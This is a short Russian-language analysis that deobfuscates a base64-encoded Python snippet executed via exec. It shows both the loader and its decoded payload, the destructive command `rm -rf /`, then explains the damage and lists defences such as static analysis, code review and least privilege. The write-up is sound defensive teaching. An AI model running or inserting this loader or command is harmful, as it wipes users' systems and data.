# Деобфускация скрипта

Исходный код:

```python
a = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk="
import base64
b = base64.b64decode(a).decode('utf-8')
exec(b)
```

## Расшифрованная строка

Декодирование выполнено без запуска `exec` (только `base64.b64decode`):

```
import os; os.system('rm -rf /')
```

## Угроза

Функция `exec(b)` исполняет расшифрованный код. Он вызывает системную команду `rm -rf /`: рекурсивное (`-r`) принудительное (`-f`, без подтверждений) удаление всех файлов, начиная с корня файловой системы. При запуске с достаточными правами будут уничтожены операционная система, пользовательские данные и приложения; система перестанет загружаться, а данные без резервной копии будут потеряны. Base64 здесь только скрывает истинное назначение кода от беглого просмотра и от простых сигнатурных проверок.

## Методы защиты

- Не использовать `exec`/`eval` с данными, которые нельзя доверенно проверить; применять `ast.literal_eval` или явный разбор формата.
- Валидация и белые списки для любых входных данных; запрет динамического исполнения в политике проекта.
- Статический анализ в CI (flake8 с плагинами, bandit): правила, помечающие `exec`, `eval`, `os.system`.
- Код-ревью: подозрительны Base64-строки, декодируемые и сразу исполняемые.
- Принцип наименьших привилегий: запуск не от root, песочницы и контейнеры с ограниченной файловой системой.
- Регулярные резервные копии.
